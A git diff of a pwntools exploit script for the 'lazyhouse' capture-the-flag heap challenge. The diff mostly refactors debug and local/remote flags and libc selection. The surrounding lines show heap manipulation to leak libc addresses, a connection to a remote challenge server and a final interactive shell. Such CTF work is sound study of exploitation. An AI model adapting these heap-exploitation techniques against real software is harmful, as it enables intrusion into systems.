@@ -1,25 +1,19 @@
 from pwn import *
-context(os="linux", arch="amd64")
-
-DEBUG = 1
-LOCAL = 1
-
-def debug_on():
-	context.log_level = "debug"
 
 g_fname = "./lazyhouse"
 g_elf = ELF(g_fname)
-g_libcname = "/lib/x86_64-linux-gnu/libc-2.29.so"
+context.binary = g_elf
+g_libcname = "/lib/x86_64-linux-gnu/libc.so.6" if (args.LOCAL) else args.LIB
 
-if (LOCAL):
+if (args.LOCAL):
 	g_io = process(g_fname)
-	g_libc = g_elf.libc
 else:
 	g_io = remote("node3.buuoj.cn", 27650)
-	g_libc = ELF(g_libcname)
+	
+g_libc = ELF(g_libcname)
 
 def getpid():
-	if (DEBUG & LOCAL):
+	if (args.LOCAL):
 		log.info("PID: %d", g_io.proc.pid)
 		pause()
 
@@ -90,8 +84,8 @@ def pwn():
 
 	# trigger extending
 	delete(1) # now we have ub->chk[0x420]->ub
-	delete(0) # make slot[0] useable
-	delete(5) # make slot[5] useable
+	delete(0) # make slot[0] available
+	delete(5) # make slot[5] available
 
 	new(0, 0x230, flat(["leak libc".ljust(0x200), 0x100, 0x101]))
 	show(2)
@@ -135,6 +129,7 @@ def pwn():
 	sla("Size:", str(heap_base + 0x1d30))
 
 if ("__main__" == __name__):
-	debug_on()
+	if (args.DEBUG):
+		context.log_level = "debug"
 	pwn()
 	g_io.interactive("leo^^$")
